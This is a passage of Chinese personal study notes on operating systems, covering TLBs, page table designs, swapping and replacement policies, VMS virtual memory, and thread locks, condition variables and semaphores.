CPU 自行处理；这种办法会增加 CPU 设计的复杂性，因为 CPU 需要执行一些自己的代码（指令）并知道页表在物理内存中的位置和格式，因此需要设计较为复杂的指令集 CISC； 软件办法：由 OS 来处理；这种办法增加了灵活性，OS 可以使用任意数据结构，不像 CPU 一出厂就写死了；另外也让 CPU 的设计变简单了，只需要设计较简单的指令集，即 RISC； 随着 CPU 芯片集成的电路变得越来越大，两种指令集的差异消失了，复杂指令集现在运行起来跟简单指令集一样快； TLB 的内容TLB 是缓存，因此也可以看做是一个数组，这些数组的元素是无序的，每一个元素是一条 TLB 记录，记录中保存着某个虚拟地址和物理地址的映射；由于它们是无序的，因此每条记录中需要同时保存虚拟页号 VPN 和物理页号 PFN，不然仅有一堆物理页号则完全不知道它们属于哪个虚拟页号的了； 除了 VPN 和 PFN 外，一条 TLB 记录中还有几个额外的位来存储一些额外的信息，例如： 有效位：用来判断当前记录中的映射信息是否有效，这样在切换进程时，只需将有效位全部设置为无效即可，无需删除整条记录；这样就可以避免当前进程使用上一个进程的映射了（重置缓存中所有条目的有效位也是一个不小的工作，因此还有另外一种办法是引入地址空间标识符，来判断当前进程是否匹配）； 保护位：用来标记该页的内容的访问权限，例如是只读、可写，还是可执行等； 另外还有一些其他位如地址空间标识符、脏位等； 上下文切换时 TLB 的处理一种方案是直接重置所有有效位为 0，这种方法可以确保新进程不会访问旧进程的映射，但是它的缺点是性能开销很大；解决的办法是通过引入地址空间标识符（一般是8个位），来代表不同的进程，这样在切换时，就不需要重置了，但是在搜索时，需要增加对这个标识符的判断，只有标识符 和 VPN 都匹配时，才是缓存命中； TLB 替换策略有两种可用策略： 最小引用策略：即将最近最少使用的 TLB 换出；优点是尽量保持高命中率；缺点是偶尔会出现极端情况； 随机策略：随便选择一项换出；不会出现极端情况，但整体命中率有所降低； 实际系统的 TLB 表项此处是 MIPS R4000 操作系统来举例，在这个操作系统的设计中，使用软件来管理 TLB；因此在遇到缓存没有命中时，需要用到操作系统提供的关于更新 TLB 的一些指令； 该系统单个 TLB 记录有 64 个位，其中： 有 19 位用来存 VPN（正常是20位，但因为地址空间有一半被预留给内核，因此实际的用户空间只用 19 位即可表示）； 有 24 位用来存 PFN（因为可以支持最大 2^24 的地址空间，约为 64GB 的物理内存）； 有 1 个 G 位用来表示当前的记录是否是全局的，如果是的话，则不用检查地址空间标识符； 有 8 位用来存储地址空间标识符； 有 3 位用来表示一致性； 有 1 个 D 位（脏位）用来表示记录是否被改写过； 有 1 个 V 位（有效位）用来表示当前记录的内容是否有效； 剩下的都是一些暂未使用的位； MIPS 的 TLB 一般总共有 32 个记录或者 64 个记录；大多数留给用户进程使用，但它有一个寄存器，可以用来设置有多少个记录需要预留给内核使用；在这些预留的记录中的映射，用来保存操作系统自己在某些时刻下要用的代码和数据； 16.分布：较小的表简单数组结构的单级线性页表带来的一个问题是占用空间过大，因此需要寻找新的办法，例如通过以时间换空间的方法，来解决内存占用过大的问题。 方法一：更大的页由于地址长度是固定的，因此如果单页变大，则页号的范围变小，因此页表的记录数也随之变少，这样页表就变小了；例如对于 32 位地址，单页设计为 12 位，此时单页的大小为 2^12 字节，约为 4KB，页表条目需要 20 位，因此有 2^20 个条目，每个条目有 4 字节，总共需要 4MB；如果将单页设计为 14 位，大小变成 16 KB，则页表条目只需 2^18 个，少了 4 倍，变成 1MB； 结果看上去不错，占用空间只剩下 1MB 了，而且还提高了缓存命中率；但其实这是以增加单页的内部碎片为代价的，即每次为进程分配内存时，最小单位都是 16KB，但它实际上可能常常用不了这么多，因此造成了很多内部空间浪费； 更大的单页有一个额外的好处是可以提高 TLB 的命中率，减少 TLB 记录数；这对于某些特定的应用，例如数据库管理程序很有必要，因为数据库中的数据是挨在一起的一个整体，而且经常频繁的随机访问，通过大单页，例如单页 4MB，可以有效提高缓存命中率，减轻 TLB 的压力； 方法二：分段+分页由于虚拟地址空间很大，但实际的进程实际的地址，只占里面很小很小的一部分，因此如果页表为整个虚拟地址空间都提供映射记录，显然绝大部分记录都是空的，存在巨大的空间浪费；所以，可以通过引入分段，为虚拟地址空间中的不同段，提供不同的页表，而不再是一个页表； 由于分段在原先的虚拟内存设计中就已经天然存在，因此可以提前已经存在的段基址寄存器（包括代码段、堆段和栈段），让它们的值指向对应段的页表的物理内存地址，即可以访问每个段各自的页表； 简单的分段其实并不能带来页表占用空间变小的好处，因为每个段也是很大的，关键点在于引入每个段的界限；当一个段拥有界限后，它不再是很大了，而是有限的大（通常都很小）；界限的存在是通过界限寄存器来实现的，通过在界限寄存器中保存一个段大小的值，我们就拥有了有限大小的段；然后页表的记录数，也只需跟段的大小匹配即可，这样页表就变得很小了； 分段+分页的方法其实是要付出一定的性能代价的，因为段的大小是动态可变的，这意味相应段的页表也变成了动态的；因为当原分配给页表的空间不够用时，就需要为页表分配新的空间并迁移它； 方法三：多级页表虚拟地址空间也是很稀疏的，通过引入页表，让它在物理内存中的存放变得紧凑和灵活了起来；同样的思想也可以运用在页表本身的存储上面，通过引入页目录的结构（作用跟页表类似），页表不再被线性存储，而是映射存储；这个方法的优点是占用的空间大大减少了，只按最小单位（页）来存储，没有浪费；缺点是需要付出一定的性能代价，因为页目录本身也是需要存储在内存中，在得到最终的 PFN 前，需要增加一次或多次物理内存访问（取决于页表分成几级）； 就像内存虚拟化技术一样，多级页表相当于将页表虚拟化了；而且还不只是一级的虚拟化，为了最小化内存占用，还可以丧心病狂的使用多级虚拟化； 方法四：反向页表反向页表的思路更加极端，在多级页表中，每个进程拥有自己的页表，而反向页表，则是所有进程共用一个页表；该页表的单个页表项中，包括三方面的信息： 地址空间标识符：用来记录当前记录属于哪个进程； VPN 虚拟页号 PFN 物理页号 然后使用 HASH 散列表结构来建立映射和存储；类似于以字典键值对的方式来实现映射和转换；优点是极端节省空间；缺点是性能将有所下降，因为随着字典变大，需要进行迁移，分配更大的空间来容纳映射关系； 方法五：交换到磁盘这个方法倒是一劳永逸的节省空间，但是性能最差； 17.物理内存不足：机制虽然现在的物理内存相对早期已经大了，但是应用程序运行时所占用的内存也比过去变得更大；当同时运行的应用程序足够多时，不可避免会遇到物理内存不足的情况，此时需要有一个机制，能够将部分物理内存转移到其他存储空间，等需要的时候，再转回来，以避免物理内存不足的窘境； 交换空间交换空间 swap space 机制是现代系统使用的一种解决方案；通过将部分暂时不用的物理内存页，交换到硬盘中，来缓解内存不足的问题； 进程运行起来后，代码已经被加载到内存；如果此时运行下一个程序时，发现内存不足，此时有两种解决方案，一是将上一个程序的代码转移到交换空间中；另一个是不交换，等后续要用的时候，再重新从硬盘中加载，因为代码本来就是从硬盘中加载过来的； 存在位为了能够实现交换空间机制，需要在页表中额外安排一个位，用来表示当前条目所代表的物理内存页，是否真的在物理内存中，还是在硬盘上，这个位称为有效位； 当试图访问一个存在位为 0 的物理页时，会触发页错误，然后操作系统会接管并处理这个错误，将数据从硬盘加载到内存中，然后重新执行指令； 页不存在只是页错误的一种，还有其他情况也会触发页错误，例如非法访问； 页错误当数据存储在物理内存页中的时候，PFN 是有用的，但是如果该页被交换到了硬盘中，则 PFN 就没有用了（失效了），此时只需通过存在位，即可以触发页错误；因此，无效的 PFN 所占用的位，刚好可以用来存储数据在硬盘上面的位置索引；操作系统可以根据该索引，从交换空间中，将数据加载回内存；然后更新页表中的 PTE 条目的 PFN 为最新值，并更新 TLB 记录（硬盘管理 TLB 的系统估计不更新，只有软件管理的才会），之后重试指令； 交换策略当从硬盘中将页数据交换回物理内存时，有可能物理内存已经是满的，此时需要将部分页换出到硬盘上，如果选择待换出的内存页，需要使用一个好的交换策略，以避免给程序运行带来巨大的性能损失； 页错误处理当页错误被触发时，操作系统从 PTE 中获得硬盘地址，然后在物理内存中寻找到空闲页，访问硬盘读取页数据，并加载数据到空闲页中，将该空闲页的页号更新到 PTE 中；如果没有找到空闲页，则会触发页交换，将物理内存中已有的部分页面，交换到硬盘上； 什么时候交换操作系统会设置两条线，一条是低水位警戒线，当物理内存中可用的空闲页低该警戒线时，就会触发页交换守护进程（page daemon 或 swap daemon）；另一条是高水位安全线；交换守护进程的交换工作会一直持续到当前可用的内存页到达安全线后停止下来，然后进入休眠状态，直到下次被唤醒； 由于硬盘的写入速度很慢，交换进程会凑齐足够数据的待交换页后，再一次性交给硬盘处理，从而提高硬盘的访问性能； 18.物理内存不足：策略当物理内存满了时，选择哪些页面，将它们转移到交换空间，是一个需要好好思考的问题；由于硬盘的访问速度非常慢，因此如有可能，应该尽量避免出现访问硬盘的情况，至少要让概率尽可能小； 理想的替换策略是将未来最不可能用到的页替换出来，这样命中率是最优的，缺点是这个策略基本无法实现；因为在替换的时候，我们无法开启上帝视角，无法判断哪个页是将来最不可能会用到的； 简单策略：FIFO先进先出是最简单的策略，缺点是命中率比较低； 随机策略：Random优点：实现简单； 缺点：性能看运气； 基于历史：LRULRU 是 Least Recently Used 的缩写，表示最少最近使用； 这个策略利用了程序运行时常常表现出来的局部性特征，即最近访问的数据，也可能在接下来再次被访问； 性能视场景而定不同的业务场景将决定不同策略的性能表现，虽然 LRU 在多数情况下表现的更好，但它也有一些应付不了的极端情况，此时有可能随机策略反而表现得更好； LRU 的实现想要实现 LRU 是有难度的，因为它需要额外记录每个内存页最近被引用的时间，这样才能判断出谁是最少最近使用的；但随着物理内存变大，页表条目变多，通过全局扫描查找最少最近使用条目，将需要付出巨大的时间代价，有可能得不偿失； 近似 LRU由于完美的 LRU 实现代价很大，因此需要寻找一个近似的替换算法，这样既可以避免性能开销，又可能达到类似的命中率效果； 这类型的近似算法有很多，它们大体的思路也类似，即通过增加一个使用位，来标示当前页是否最近被使用，初始默认所有页的使用位都为 0；使用某个指针寄存器，让它随机批向一个页；当某个页被读写的时候，就将其使用位设置为 1，表示最近该页有过读写的动作；当需要进行页替换时，操作系统通过指针往下遍历每个页，如果某页的使用位为 1，则将其设置为 0，然后继续往下查找，当找到第一个“使用位”非 0 的页时就进行替换； 除了使用遍历查找外，还可以考虑使用随机查找，效果差不多； 考虑脏页由于与硬盘通信的开销很大，一般会将多个修改后的页进行批量化处理，集中一次性的写入，而不是改一个写一个；因此在替换内存页的时候，有可能会遇到该页暂未写入硬盘的情况；因此，通过增加一个修改位（脏页位）来对已修改未写入的页进行标识，不替换该页，而是尽量替换干净页； 其他读写策略除了页替换策略外，虚拟内存还同时使用一些其他的策略来提高内存管理的效率，例如： 按需读取策略：只在页被指令访问时，才将页从硬盘中加载到内存中； 预读取策略：只在有很大把握某个页接下将被访问时，提前将页从硬盘中加载到内存； 批量写入策略：集中将多个内存页的修改，一次性写入硬盘，而不是改一个就马上写入； 抖动当应用程序对某个巨大的数据结构进行计算时，如果该数据结构占用的内存超过了物理内存的可能容量，那么在计算过程中，部分数据将被交换到硬盘中，然后又很快需要被加载回来，同时又换出去一部分，反复循环，导致 CPU 都将时间花费在了触发页错误和加载数据过程中，完全没有办法进行实际的计算，这种情况称为内存的抖动； 19.VAX&#x2F;VMS 虚拟内存系统操作系统的部分功能需要硬件的配合，才有可能高效稳定的实现，但是市场上的硬件种类多种多样，而且不同硬件的开发人员水平参差不齐，不可避免存在缺陷，因此操作系统的开发者将不可避免需要解决通用性的问题，即如何让同一个操作系统，在不同的硬件上面，都可以稳定的运行。 操作系统的存储操作系统本身也需要物理内存来存储自己的代码和数据，它有三种实现方式： 直接存储在物理内存中（缺点：无法实现页交换，因为没有虚拟内存这一层） 有自己的完整虚拟内存，像是另外一个单独的应用程序（缺点：不方便和应用程序之间的数据通信） 做为应用程序的一段分，使用单独的段（内核段）来映射它（目前为大多数系统所采用） 问：好奇是内核否有自己的单独页表，还是与应用程序共用一张页表，因为内核段也有自己的堆，意味着有动态的数据需要存储？如果是共用页表的话，每张页表都有一些重复的项目，有一定的空间浪费； 答：实际上很可能是使用分段+分页的机制，即总共有三对基址寄存器和界限寄存器（总共6个）；内核段有自己的基址和界限寄存器，而且还是每个应用共用的；在进行应用程序切换时，只需要改变 P0 和 P1 寄存器，无须改变 S 寄存器； 页替换 问：在进行页替换的时候，LRU 策略是一种全局的策略，它只会从当前页表的所有条目中，挑出最少最近使用的进行替换，而无视这些页表本身是否占用了过大的内存；因此，需要设计一种机制，对单个进程的可用内存上限进行控制； FIFO解决方法是为每个进程设置一个可用内存的上限（由于内存是分页的，相当于有了一个可用的页数上限）；将进程的所有页都放在一个 FIFO 列表中，当列表的长度达到上限时，就基于先进先出的原则，将最早写入的页从 FIFO 列表中清除，并替换到硬盘上的交换空间中； 如果可用上限值比较小，立即执行的 FIFO 策略，将有可能使得进程的性能下降，因为其数据频繁的在内存和硬盘之间交换；为了提高性能，VMS 系统额外增加两个全局的列表，一个用来存放干净的页，一个用来存放脏页； 当某个进程 P 的 FIFO 列表满了时，踢出的页并不会马上被交换到硬盘中，则是先放入干净页或者脏页（取决于脏位的值）的末尾，此时进程 P 的性能并没有受到任何的影响，因为它所有的页仍然在内存中； 当进程 P 执行结束，切换到进程 Q 时，如果进程 Q 需要用到一个空闲页来存储数据时，系统就从干净列表的头部取出一个页，将其替换到硬盘上，然后交给进程 Q 使用； 如果两个全局列表的长度足够大，这种策略的性能将非常接近于 LRU 策略；这个策略本质上利用了局部性的原理，将各个进程要换出的干净页先集中放在一起，然后按时间顺序，先进先出的替换；这样避免了替换最近的页，而是替换最远的； 批量处理上述增加全局脏页列表的做法，还有另外一个好处，即由于写入硬盘的性能代价比较大，因为可以等到脏列表满了后，再一次性的批量写入，这样就可以尽量减少写入的次数；写入完了后，原来的脏页就变成了干净页了； VMS 的页表条目中，并没有额外的使用位来标记条目所代表的页，是否最近被引用过；它使用了另外一个巧妙的机制，来达到相同的效果，即使用保护位；初始化的时候，所有条目的保护位先置为不可访问；因为操作系统在访问一个页之前，即判断它的权限，如果可访问，则将保护位设置为只读或可写；这样，当需要进行页替换时，操作系统可以通过查看保护位是否被重置过，如果有，表示最近有被使用；如果没有，表示未被使用； 问：将应用程序从硬盘中加载到内存中的时候，到底发生了什么？ 答：操作系统需要做如下事项： 在进程表中增加一个条目，并写入一些关于进程的元信息 初始化一个新的页表（此处假设是单个线性页表），在进程条目中记录该页表在物理内存中的位置 寻找空闲页，将代码和数据载入空闲页中，将空闲页的 PFN 写入页表的相应位置； 惰性技巧按需置零因为物理内存是在多个应用程序间共用的，当某个物理内存页被 A 进程释放后，随后该页可能会被进程 B 使用，但此时页上面仍然留有 A 进程的数据，因此需要避免这些数据被 B 访问，这样才能确保安全性；比较土的办法是在该页分配给 B 使用时，就将该页上面的全部数据置 0，这样做可以确保绝对安全，但是性能代价很大，因为有可能 B 只用到该页的一小部分空间，大部分空间并不使用； 通过引入按需置零策略，可以减少性能开销；在分配页给 B 时，操作系统只是先通过保留位将该页标记为按需置零，并不真正的去置零；然后在真的要读写数据时，在检查权限的时候，操作系统顺便检查按需置零位，如果为真，则再做一下置零的工作； 写时复制当某页数据需要从进程 A 复制到进程 B 时，操作系统一开始并没有直接的复制数据，而只是将该页的物理页号写入进程 B 页表中，这样两个进程不同的 VPN 映射到了相同的 PFN，并在进程 B 中将该页标记为只读；后续如果进程 B 需要对该页进行写入操作，操作系统发现该页为已读，此时才会触发真正分配新页和复制工作； 这个技术在 FORK 的时候特别有用，减少了极大的性能开销；另外在多个进程之间使用共享库时也有用； 20.并发：介绍通常情况下，进程只面对一个使用者，仅有单一的任务目标，完成一系列指定的操作并得到结果；但是有些情况下，进程可能要面对多个使用者，例如运行在服务器上的进程，为成千上万的访问者提供服务；这些访问者发起的服务请求，对进程来说形成了一种并发的挑战；为了应对这个挑战，引入了线程的概念； 每个线程拥有自己一个独立的栈，不同线程之间的栈不会相互干扰；但它们共用进程的整个地址空间；因此，在切换线程时，并不需要更改页表的寄存器，只需更新程序计数器，以及其它用于存储计算结果的寄存器； 进程切换时，需要保存当前进程的状态，使用进程控制块（Process Control Block，PCB）来保存； 线程切换时，使用原理类似的线程控制块（Thread Control Block，TCB）来保存； 当创建一个线程时，需要传递待执行的例程（即函数）给它，至于这个例程什么时候被 CPU 安排执行，则是不可控的，它有可能比主程序的下一行代码早，也可能比它晚，一切取决于操作系统的调度程序当时心情怎么样。 并发场景 修改全局变量：两个线程访问修改彼此共享的变量； 依赖：一个线程的执行需要等待另外一个线程的结束； 21.插叙：线程 API创建与完成 问题：操作系统应该提供哪些创建线程的接口，并当它们简单易用？ 在 C 中，可以通过 POSIX 库的 phread_create 函数来创建线程，并通过 phread_join 函数来等待它的返回； 如果每创建一个线程后，马上调用 join 函数等待它的返回，这样完全没有意义，完全实现不了并发，其使用效果跟普通的函数调用没有任何区别；因此重点在于在等于线程返回前，有机会创建更多的线程，这样才有可能实现并发的效果； 有些多线程的 Web 服务器会创建一个主线程，并根据需要创建大量的工作线程；当主线程收到用户的请求后，会将该请求转发给某个刚创建好的工作线程，并且也不需要等待它的返回，这样一来，主线程本身就实现了并发的处理，即它在理论上可以接收并处理海量的请求（具体的数量上限取决于硬件的能力） 锁当线程需要对共享的全局变量进行修改时，不可能避免需要处理并发的问题；Pthread 库通过引入锁机制来实现；原理也非常简单，先初始化一个锁类型的变量，当需要执行临界代码时（即将改变共享变量的代码），调用 phread_mutex_lock 来尝试获取锁； 如果能够得到，就继续往下执行代码，并在执行完毕后调用 pthread_mutex_unlock 函数来释放锁，以便让其他等待中的线程可以获取到锁； 如果不能得到，就进入阻塞等待的状态，直到获取到锁为止； Pthread 库中另外还有其他与锁相关的函数，包括： pthread_mutex_trylock：用来尝试获取锁，如果得不到，直接返回失败，不等待； pthread_mutex_timelock：用来尝试获取锁，并在给定的时间内等待，如果时间到期后仍然得不到，返回失败； 用途：锁的机制可以用来解决多个线程修改共享的全局变量场景； 条件变量 用途：条件变量可以用来解决线程之间的依赖等待关系；仅靠条件变量性能不够好，结合锁的使用，有助于提高性能，避免等待线程出现自旋；假设有两个线程，其中 B 需要等待 A 的结果；当 B 获取不到锁时，就进入睡眠；如果 B 能够获取到锁，但条件变量未满足，则 B 就释放锁，然后进入睡眠；A 则负责获取锁，并在计算完成后，改变条件变量，然后释放锁，并唤醒 B； 假设某个线程 A 的执行，依赖于另外一个线程 B 的完成，则 B 在完成后，需要释放某种信号，以便 A 可以知悉状态，并开始执行自己的代码； 最简单的办法是引入一个标记变量（或叫状态变量），A 线程定时检查标记变量是否发生了变化，如果已经变化了，就开始执行自己的代码；B 线程负责在完成自己的工作后，改变标记变量的值，以便传递信号通知 A 线程； 但是上述这种方法的性能很不好，因为 A 线程需要循环的检查标记变量，可能在大部分时间内，其检查工作都是无用的；为了解决性能，可以通过引入条件变量和锁变量，利用条件变量的特殊性来降低性能损失；其原理是先调用函数让需要等待的线程 A 进入睡眠状态，然后 B 线程通过改变条件变量来唤醒它；这样 A 线程在等待期间就不需要反复检查前一种方法中的标记变量了；这种方法更加安全的原因在于 A、B 线程通过引入锁保证了执行的先后顺序； pthread_mutex_wait(&amp;cond, &amp;lock)：该函数接收一个条件变量和一个锁变量作为参数；当调用该函数时，它会让当前线程 A 进入睡眠状态，并释放锁； pthread_mutex_signal(&amp;cond)：在线程 B 中，在获得 &amp;lock 指向的锁后，开始执行自己的代码，并在执行完毕后，调用 pthread_mutex_signal 函数，它会更改 &amp;cond 变量，以便发出信号唤醒处于睡眠状态的 A 线程；之后线程 B 还需要调用 pthread_mutex_unlock 函数释放锁，以便线程 A 在唤醒后可以获得锁 &amp;cond 可以用来唤醒另外一个进程，但为了保险起见，书中的例子还额外引入了一个 ready 变量，来确保 B 线程的代码真正完成了指定的操作，以便防止 A 线程被意外唤醒的情况；相关于有了双保险的机制； 22. 锁表面上看，锁好像是一个类似状态变量的东西，但其实它是一个结构，里面除了保存状态值外，还保存着当前持有它的线程信息，只是这些信息通常对使用者是隐藏的； 问：锁为程序员提供了一个很方便的实现线程有序并发的工具，但在操作系统和硬件层面，它们需要如何实现锁的机制？ 答：需要 CPU 提供一些原子性的指令，这些指令可以用来修改设置变量，从而实现锁的机制；仅由软件实现的锁机制是不可靠的，因为完全不知道 CPU 的时钟中断何时会发生，而一旦发生，将使得处理逻辑失效； 评价锁锁的实现有多种方案，有三个维度可以用来评价实现方案的优劣： 有效性：能够真的实现互斥的效果； 公平性：不至于有些等待线程一直无法抢到锁，导致最终饿死了； 性能：引入锁之后，性能开销最小化； 方案1：控制中断之所以会面临并发的问题，在于 CPU 的操作并非原子性的，它通过时钟中断来实现在不同进程或线程之间的切换；因此当线程进入临界区后，如果能够关闭中断，等待当前线程处理完，再恢复中断，就可以实现互斥性； 控制中断的方案实现起来很简单，但是缺点很多，包括： 无法规避恶意程序； 无法支持多处理器； 中断时可能丢失其他程序发出的中断消息； 性能太差：因为 CPU 内部要做一系列准备工作； 基于以上这么多的缺点，这种实现方案用得场景非常少；仅在操作系统内部使用，而不是在 CPU 内部使用，即操作系统选择性的在某些时刻暂时屏蔽它自己接收到的中断消息，将手头某个任务全部处理完后，再恢复处理中断队列中的消息； 没有硬件支持，仅通过软件实现的锁很危险，因为完全无法控制时钟中断何时会发生，有可能当前线程 A 正检查完锁可用时，中断了，切换到另外一个线程 B，然后它也发现锁可用；然后设置标记变量为 1；这时中断发生，切换回进程 A ，它接着上次的中断处继续进行，也觉得当前锁自己可用；最终的结果是两个线程同时进入了临界区；锁的互斥性根据没有得到有效实现；因此，必须有硬件的支持，让某些操作指令原子化； 方案2：测试并设置指令“测试并设置”指令也叫做原子交换（atomic exchange），它的思路是设置一条由 CPU 支持的原子性执行的指令；这条指令会取出旧值，设置新值，并返回旧值； 当有了这条原子性执行的指令后，应用程序就可以基于它们来实现锁；当一个线程暂时取不到锁时，它会陷入自旋等待，直到另外一个线程释放了锁为止； 在 x86 机器上，原子交换指令写成 xchg； 自旋等待的锁有两个缺点： 在等待期间，会消耗掉分配给它的完整时钟周期，无谓消耗浪费了很多性能；当线程特别多且为单处理器时，这点尤其明显； 自旋机制本身不保证线程不会饿死，线程能否抢到锁，完全看调度器的心情； 方案3：比较并交换指令“比较并交换”指令也是一条由 CPU 支持的原子性执行的指令，它跟“测试并设置“指令的区别在于多了一个参数，这个参数会传入一个预期值，若旧值和预期值相同，再更新为新值，否则不更新；该指令也同样会返回旧值； 相当于“测试并设置”一定会更新旧值，而“比较并交换“不一定会更新旧值； 方案4：链接加载和条件存储指令这个方案用到了两条指令，一条用来加载指针指向的值，另外一条会判断该指针地址指向的值是否发生了更新，若没有发生，则将其设置为新值； 通过这两条指令的配合，可以用来实现锁机制；思路是当执行 lock 函数时，先加载标记变量的值，若为1，则自旋等待，因为表示此时有其他线程占用着锁；若为 0，则使用条件存储指令进行抢占；条件存储指令是原子性的，它会判断标记变量的值是否发生过更新，如果没有，意味着还没有其他线程抢占过，则更新它，并获得锁；如发生过更新，表示有线程提前抢占成功，重新开始循环； 方案5：获取并增加指令这个指令很有意思，它引入了两个标记变量，一个用来表示排队号，一个用来表示当前叫号；跟银行的叫号机工作原理差不多；初始状态下，排号的号码从零开始；第一个线程进来后，取到 n 号，然后排号增加 1，即下一排队号变成了 n + 1 号；取完号后，去窗口看一下当前的叫号，如果刚好是 n 号，则获取锁（开始给它办理业务）；如果不是 n 号，则等候；当线程释放锁时，窗口的服务人员会将叫号增加 1，这样持有该排队号的线程接下来就可以办理业务了； 这个指令有一个特别大的好处，即每个线程都有机会轮上，而且还是先来后到；前后三种方案则无法保证线程什么时候会被安排，靠运气； 避免自旋显然当一个线程无法获取锁时，一直处于自旋等待是完全没有必要的，纯粹是浪费分配给它的 CPU 时钟周期；如果线程很多的话，就会极大的降低性能，因此有必要当线程进入自旋时，就要求它放弃当前的时间片，切换到其他线程； 方法一是在操作系统层面增加一个能够让出当前调度的系统调用，这样当线程发现自己无法获取锁时，就调用该函数，结束当前的 CPU 时间片；这种方法的性能比自旋好了不少，不过如果线程很多的话，仍然可能产生很高的线程切换成本； 方法二是引入休眠功能，并增加一个队列；当线程无法自己获取锁时，就将自己放到队列中等待，然后进入休眠状态，这样它就不再需要频繁的被切换；当其他线程释放锁时，它就去队列里面找一个线程唤醒它； 结合队列，当一个线程取号后，就查看一下当前叫号，如果不是自己的号，就进入休眠队列，等待被唤醒；当某个线程释放锁时，叫号增加1，然后唤醒队列中对应编号的线程；该线程被唤醒后，检查一下当前叫号，如果是自己，就去尝试获取锁；如果不是自己，重新进入休眠；如果获取不到锁，则意味着有人抢占了，也重新进入休眠； 23.使用锁的并发数据结构锁的目的是应对并发的场景，但并非所有的并发，都需要使用锁；只有并发场景需要访问修改共享变量时，才需要用锁；这个时候，在设计数据结构的访问修改函数时，需要考虑锁的使用时机和位置，这样才能确保数据的线程安全；但确保线程安全不难，如果要同时兼顾性能，就开始形成一定的挑战了； 并发计数器计数器是很常见和频繁使用的一种数据结构，某些场景需要在多线程之间共享某个计数器，此时该数据结构将面临线程安全问题；此时会遇到的一个问题是可扩展性，即保证线程安全的情况下，访问性能没有下降，即实现可扩展的计数； 可扩展的计数 单核多线程可以实现并发，但并没有提高性能，只有多核多线程，才通过利用了多核的优势，提高了性能；所谓的可扩展性是指，在引入多核的情况下，原本的锁设计，仍然能够保证对数据结构的访问，能够获得跟单核单线程同样的性能； 它的实现有很多种办法，其中一种叫懒惰计数器，它通过牺牲一点准确性，来保证性能问题；其基本思路是使用全局锁和全局变量来记录全局的计数器，但在每个 CPU 里面，又增加一个局部计数器和局部锁；对于单个 CPU 内部的线程，它只负责当前 CPU 的锁并更新局部的计数器，这样一来没有人跟它竞争，因此它的性能同单核单线程是一样的；然后设定一个阈值，当某个 CPU 的局部计数器值越过这个阈值时，该 CPU 就尝试获取全局锁，将自己的局部计数器值同步写入全局的计数器； 整体来说，当 S 足够大时，这种方法的性能跟单核单线程越接近，但是全局计数器会有一定的延迟；即任意时间点下，获取到的全局计数器值，可能并不是最新的，而是对应于过去的某个时间点； 并发链表让链表的操作实现线程安全并不复杂，重点是保证在更新链表的关键时刻（即临界区）加锁即可，并在更新完之后，释放锁，避免将加锁的位置提前到内存分配的时候，因为内存分配有可能发生错误，这样会导致锁没有释放； 虽然链表的线程安全容易做到，但是多核多线程下的高性能却是很有挑战，因为链表是一种线性查找的数据结构，它无法提前将任务分段，交给不同的 CPU 并发处理； 并发队列对于先进先出的队列，需要设置两把锁，一把负责头部，一把负责尾部，它们之间可以实现并发，即在头部删除元素和尾部增加元素并不会发生冲突； 并发散列表在不考虑改变散列表大小的情况下，散列表的实现只需要基于之前的链表结构即可，每个桶对应一个单独的链表；而每个链表的背后已经是支持线程安全的；这种结构的散列表具有很好的扩展性，因为它实质上是链表间独立的锁，并不会相互影响； 24.条件变量使用场景锁只是解决了线程并发访问某个共享变量的问题，但有时候线程之间需要等待某种条件满足后才能继续往下进行，例如当某个线程执行完毕后，另一个线程再开始执行。最简单的解决方案是引入某个条件变量，需等待的线程在它的时间片中，不断的检查这个变量，如果条件满足了，就继续往下执行，如果不满足，就自旋等待。该方案的好处是实现简单，缺点是性能低下，因为自旋需要浪费掉整个时间片； 新的解决办法：除了已有的锁和条件变量后，再引入睡眠和循环检查；线程 A 持有锁后，检查到条件不满足时，就让 A 进入释放锁并进入睡眠；B 线程开始持有锁，做完动作，更新条件变量，发信号唤醒 A，并释放锁；A 被唤醒后，尝试重新取得持有锁后，再次检查条件变量，若满足，开始执行自己余下的动作； wait() 操作会做四个动作：释放锁、睡眠、被唤醒、获取锁；因此，在执行 wait 之前，当前线程获取锁是必须的，不然有可能长眠不醒了； signal() 在执行之前也需要先获取持有锁，避免产生竞态条件； 生产者&#x2F;消费者问题 当有多个生产者线程和多个消费者线程时，如何解决它们之间使用共享缓冲区可能存在冲突的问题？ 为了尽可能提高效率，应该避免单次的生产-消费之间的轮换，而应该支持批量多生产和批量多消费，这样可以减少轮换等候的成本；因此，需要引入数组的数据结构，生产者可以依次给每个数组的每个位置写入值，而无须等待消费者是否已经来把值取走了，除非整个数组都写满了；这么做的原因在于，当某个生产者线程释放锁时，抢占到锁的不一定是消费者线程，也有可能是另一个生产者线程，因此该方案可以让它有事可做，而不是放弃它抢到的时间片； 另外还需要引入两个条件变量，分别代表生产者和消费者；当某个生产者线程完成了它自己的工作后，它就同时唤醒一个消费者线程并释放锁；（但释放后并意味着下一个抢到锁的是消费者，也有可能是一个生产者，反之亦然）； 好奇：生产者是先释放锁，再唤醒消费者；还是先唤醒消费者后，再释放锁？ 答：从安全的角度来说，貌似应该先释放锁，之后再唤醒消费者；因为如果先唤醒消费者，有可能在释放锁之前，消费者抢占到了时间片，然后尝试获取锁，发现获取不到，然后就重新进入睡眠了； 覆盖条件覆盖条件的一个例子是多线程的内存分配；内存分配函数检查当前可用堆内存，如果大于待分配值，则进行分配，如果小于，则进入睡眠；内存释放函数在释放某个之前分配的内存后，唤醒睡眠中的内存分配线程；但由于不知道当前释放的内存，是否能够满足哪些待分配线程，它只能将所有睡眠中的分配线程全部唤醒； 不知道为什么这种方案叫做覆盖条件，它真实的本质是不再只唤醒某个线程，而是唤醒所有线程；虽然这种做法会降低性能，因为有些线程唤醒后发现条件仍未满足，然后只好又睡了； 24.信号量 除了锁和条件变量外，信号量是另外一种解决并发问题的方案，这个方案很有趣，感觉它好像自带队列的性质，而且去除了 while 循环； 信号量的定义信号量（semophore）是一个整数值，并配套两个函数来操作它，它们分别是： sem_wait()：也叫 down 或 P 函数，它做两个动作，一是将信号量减1，二是判断减1后的信号量是否为负数，如果是，则让当前线程进入睡眠； sem_post()：也叫 up 或 V 函数，它也做两个动作，一是将信号量加1，二是判断有无睡眠中的线程，如有，唤醒其中一个； 当信号量为负数时，该负数值刚好表示当前有多个线程处于睡眠状态中； 1234#include &lt;semaphore.h&gt;sem_t s;sem_init(&amp;s, 0, 1); // 初始化信号量，0 表示该信号量被同一进程的多个线程共享；1 表示初始值为 1； 二值信号量（锁） 